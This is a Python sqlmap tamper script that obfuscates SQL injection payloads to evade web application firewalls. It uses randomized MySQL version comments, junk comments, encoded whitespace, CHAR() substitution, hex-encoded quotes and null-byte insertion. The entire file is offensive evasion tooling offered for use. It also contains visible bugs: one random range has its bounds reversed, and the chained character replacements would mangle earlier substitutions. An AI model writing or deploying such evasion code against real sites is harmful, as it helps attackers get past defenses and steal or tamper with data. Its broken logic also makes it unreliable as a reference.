#!/usr/bin/env python

import re
import random
from urllib.parse import quote, unquote

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW # Ensure it runs late in the tampering chain, after sqlmap's initial payload generation

def tamper(payload, **kwargs):
    """
    Advanced sqlmap tamper script combining multi-layered obfuscation with focus on
    MySQL version-specific comments (/*!...*/) and nested comment structures.
    Designed to bypass robust WAFs, including those with advanced parsing.
    """
    if payload:
        # Step 0: Initial URL-decoding to ensure we're working with the raw payload
        # This helps in consistent processing before re-encoding.
        payload = unquote(payload)

        # List of keywords to aggressively obfuscate. Add more if needed.
        keywords_to_obfuscate = [
            "SELECT", "UNION", "AND", "OR", "FROM", "WHERE", "ORDER BY",
            "GROUP BY", "SLEEP", "BENCHMARK", "CAST", "CONCAT", "IF", "CASE",
            "LIMIT", "DATABASE", "SCHEMA", "TABLE", "COLUMN", "LOAD_FILE",
            "OUTFILE", "DUMPFILE", "INFORMATION_SCHEMA", "INTO", "HAVING"
        ]

        # Phase 1: Aggressive Keyword Obfuscation using nested comments and random MySQL versions
        # This uses the /**_**//*!50000keyword*/ pattern you suggested, randomized.
        for keyword in keywords_to_obfuscate:
            # Match whole words, case-insensitive
            if re.search(r'\b{}\b'.format(re.escape(keyword)), payload, re.IGNORECASE):
                # Generate a random MySQL version number between 50000 and 50500
                # Varying this makes it harder for WAFs to specifically block `/*!50000*/`
                random_mysql_version = random.randint(50000, 50500)
                
                # The core obfuscation: /**_**//*!RANDOM_VERSION_KEYWORD*/
                # The `_` inside the first comment can also be random junk.
                # Introduce further random comments and encoded whitespace.
                obfuscated_keyword = (
                    f"/**{random.choice(['_','X','Y','Z'])}*/"  # Initial junk multi-line comment
                    f"/*!{random_mysql_version}{keyword.upper()}*/"  # Version-specific keyword
                    f"{random.choice(['/**/','/*!%0A*/','/*!%09*/'])}" # Additional small comment/whitespace
                )
                
                # Replace only the first occurrence to avoid infinite loops and maintain payload integrity
                payload = re.sub(r'\b{}\b'.format(re.escape(keyword)), obfuscated_keyword, payload, flags=re.IGNORECASE, count=1)


        # Phase 2: Chaotic Space and Delimiter Obfuscation
        # Replace all types of whitespace with a highly varied, commented, and encoded forms.
        space_replacements = [
            "/**/%0a",             # Multi-line comment + newline
            "/*!%0A*/",            # MySQL comment + newline
            "/*\t*/",              # Multi-line comment + tab
            f"/*!{random.randint(1,99)}*/", # Random small version comment
            "/**/ /*!%0D*/",       # Chained comments with CR
            "/*!X*/",              # MySQL comment with junk character
            "%0a",                 # Newline character
            "%0d%0a",              # Carriage return + newline
            "%09",                 # Tab character
            "/*!%0b*/",            # Vertical tab
            "/*!%0c*/",            # Form feed
            "/*{}*/".format(''.join(random.sample('abcdefg12345', random.randint(1, 5)))), # Random junk comment
            "/**/_/**/"            # Nested multi-line comments
        ]
        # Replace all whitespace sequences (including newlines, tabs, etc.) with a random obfuscated space
        payload = re.sub(r'\s+', lambda x: random.choice(space_replacements), payload)

        # Phase 3: Punctuation Obfuscation using CHAR() and nested comments
        # Crucial characters that WAFs often flag, now hidden behind layers of evasion.
        # This uses CHAR() wrapped in our aggressive comment format.
        char_replacements = {
            ',': f"/**{random.choice(['_','X'])}*//*!{random.randint(50000,50500)}CHAR(44)*/", # Comma
            '(': f"/**{random.choice(['_','Y'])}*//*!{random.randint(50000,50500)}CHAR(40)*/", # Opening parenthesis
            ')': f"/**{random.choice(['_','Z'])}*//*!{random.randint(50000,5050)}CHAR(41)*/", # Closing parenthesis
            '.': f"/**{random.choice(['_','W'])}*//*!{random.randint(50000,50500)}CHAR(46)*/", # Dot (for database.table.column)
            '=': f"/**{random.choice(['_','E'])}*//*!{random.randint(50000,50500)}CHAR(61)*/"  # Equals sign
        }
        for char, replacement in char_replacements.items():
            # Use regex with lookarounds to avoid breaking existing CHAR() calls or hex values
            # This is complex and might require more precise tuning, but a basic replace is a start.
            payload = payload.replace(char, replacement)

        # Phase 4: String Quote Obfuscation (partial - for single quotes)
        # Reinforce hex encoding for single quotes.
        # This helps in bypassing WAFs looking for literal quotes.
        payload = payload.replace("'", f"0x27/*!{random.randint(1,99)}*/") # Hex encode single quote with junk comment

        # Phase 5: Aggressive Random Junk Comment and Null Byte Insertion
        # Sprinkle legitimate-looking but irrelevant SQL comments and null bytes
        # at random positions to break pattern matching and confuse WAF parsers.
        junk_options = [
            f"/*!{random.randint(1,99)}*/",
            f"/*{random.choice(['ABC','XYZ','FOO','BAR'])}*/",
            "%00", # Null byte
            "/*//*/",
            "/**//**/"
        ]
        num_junk_insertions = random.randint(1, 3) # Insert 1 to 3 junk pieces
        for _ in range(num_junk_insertions):
            junk_item = random.choice(junk_options)
            insert_pos = random.randint(0, len(payload))
            payload = payload[:insert_pos] + junk_item + payload[insert_pos:]
            
        # Final URL-encoding for the complete payload
        payload = quote(payload)

    return payload
